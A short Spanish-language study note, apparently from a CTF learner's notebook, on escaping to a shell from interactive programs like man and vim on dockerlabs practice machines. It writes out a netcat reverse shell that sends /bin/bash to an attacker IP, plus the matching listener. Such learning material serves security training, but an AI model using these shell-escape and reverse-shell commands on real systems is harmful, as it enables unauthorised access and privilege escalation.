- Tags: #escalada #escalada_privilegios #recursos_dockerlabs 

**Recurso**: Maquina ofuskeit dockerlabs.es

Cuando un comando te brinda una ventana interactiva nos da la posibilidad de ejecutar dentro de este otros comando.

![](../../../attachments/Pasted%20image%2020260210151704.png)

![](../../../attachments/Pasted%20image%2020260210151940.png)

Tambien podemos hacer `/bin/bash` y nos daria una bash con los privilegios del usuario que ejecuta el comando man
Tambien si existe el binario */usr/bin/nc*  podemos establecer una coneccion a la maquina del atacante para entregar una bash 
```
Dentro de vim pondriamos 
:!/usr/bin/nc ip port -e /bin/bash

En la maquina atacante 
nc -nvlp port
```


*Esto tambien es aplicable a vim  que es otro de los proramas que permite ejecutar comandos de forma interactiva*
# Otro ejemplo
**Recurso**: Maquina remote vulnyx.com

